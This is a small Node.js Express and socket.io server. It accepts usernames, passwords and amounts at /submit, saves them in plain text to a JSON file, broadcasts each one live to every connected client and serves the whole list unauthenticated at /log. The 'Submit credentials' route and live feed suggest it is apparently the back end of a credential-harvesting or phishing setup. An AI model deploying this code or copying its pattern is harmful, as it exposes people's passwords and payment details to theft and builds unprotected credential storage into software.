const express = require('express');
const fs = require('fs');
const http = require('http');
const { Server } = require('socket.io');
const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const DEVLOG_FILE = './devlog.json';

app.use(express.static('public'));
app.use(express.json());

// Ensure devlog file exists
if (!fs.existsSync(DEVLOG_FILE)) fs.writeFileSync(DEVLOG_FILE, '[]');

// Submit credentials
app.post('/submit', (req, res) => {
  const { username, password, amount } = req.body;
  const entry = {
    username,
    password,
    amount,
    time: new Date().toISOString(),
  };

  const log = JSON.parse(fs.readFileSync(DEVLOG_FILE));
  log.push(entry);
  fs.writeFileSync(DEVLOG_FILE, JSON.stringify(log, null, 2));

  io.emit('newEntry', entry); // Send update to all clients
  res.sendStatus(200);
});

// Serve devlog entries
app.get('/log', (req, res) => {
  const log = JSON.parse(fs.readFileSync(DEVLOG_FILE));
  res.json(log);
});

io.on('connection', (socket) => {
  console.log('Client connected');
});

server.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
